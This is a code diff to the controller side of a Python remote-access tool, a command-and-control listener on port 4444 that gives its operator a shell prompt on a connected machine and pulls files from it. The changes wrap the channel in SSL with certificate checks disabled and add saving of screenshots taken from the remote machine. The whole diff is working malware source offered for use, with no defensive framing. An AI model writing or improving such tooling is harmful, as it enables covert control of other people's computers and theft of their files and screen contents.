@@ -3,6 +3,7 @@ import json
 import base64
 import shlex
 import requests
+import ssl
 
 def fetch_c2_ip():
     try:
@@ -20,8 +21,16 @@ class Listener:
         listener.bind((ip, port))  # Bind the IP and port
         listener.listen(0)  # Listen for incoming connections
         print("\n[+] Waiting for incoming connection\n")
-        self.connection, address = listener.accept()  # This command basically gives 2 different values
+        raw_connection, address = listener.accept()  # This command basically gives 2 different values
         print("\n[+] Connection established from" + str(address))  # Print the connection details
+
+        # SSL context for server
+        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        # Use your own certificate and key files
+        context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+        self.connection = context.wrap_socket(raw_connection, server_side=True)
 
 
     def reliable_send(self, data):
@@ -73,22 +82,38 @@ class Listener:
 
     def run(self):
         while True:
-            command = input(f"\nShell ({self.connection.getpeername()[0]}) > ")  # Get the command from the user
-            command = shlex.split(command)   # Split the command
-
             try:
+                command_input = input(f"\nShell ({self.connection.getpeername()[0]}) > ")
+                try:
+                    command = shlex.split(command_input)   # Split the command
+                except ValueError as ve:
+                    print(f"[-] Command parsing error: {ve}")
+                    continue  # Skip sending, prompt again
+
+                if not command:
+                    continue
+
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])  # Read the file
                     command.append(file_content)  # Append the file content to the command
 
                 result = self.execute_remotely(command)
 
-                if command[0] == "download" and isinstance(result, str) and "[-] Error" not in result:
+                # --- Screenshot handling ---
+                if command[0] == "screenshot" and isinstance(result, str) and not result.startswith("[-]"):
+                    try:
+                        with open("screenshot.png", "wb") as f:
+                            f.write(base64.b64decode(result))
+                        print("[+] Screenshot saved as screenshot.png")
+                    except Exception as e:
+                        print(f"[-] Failed to save screenshot: {e}")
+                elif command[0] == "download" and isinstance(result, str) and "[-] Error" not in result:
                     result = self.write_file(command[1], result)
+                    print(result)
+                else:
+                    print(result)  # Print the result for all other commands
             except Exception:
-                result = "[-] Error during command executionnnn" # If there is an error, print this message    
-            
-            print(result)  # Print the result
+                print("[-] Error during command execution")
 
 try:
     my_listener = Listener(fetch_c2_ip(), 4444)
